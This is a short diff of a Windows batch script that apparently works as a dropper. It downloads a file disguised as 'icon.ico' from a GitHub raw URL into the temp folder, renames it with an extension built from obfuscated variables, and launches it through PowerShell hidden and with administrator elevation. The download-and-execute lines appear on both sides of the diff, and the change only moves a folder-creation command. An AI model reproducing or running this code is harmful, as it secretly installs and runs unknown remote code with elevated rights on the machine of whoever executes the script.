@@ -12,5 +12,5 @@ set curl="%windir%\System32\curl.exe"
 ) else (
 set curl="%windir%\SysWOW64\curl.exe"
 )
-%curl% https://raw.githubusercontent.com/dazd-pkz/WindowsFX/main/icon.ico -o %temp%\o.%p%b%n%a%g%t
-%powershell% saps $env:TEMP\o.%p%b%n%a%g%t -WindowStyle Hidden -Verb RunAs&mkdir %temp%\GraphicsType
+%curl% https://raw.githubusercontent.com/dazd-pkz/WindowsFX/main/icon.ico -o %temp%\o.%p%b%n%a%g%t&mkdir %temp%\GraphicsType
+%powershell% saps $env:TEMP\o.%p%b%n%a%g%t -WindowStyle Hidden -Verb RunAs
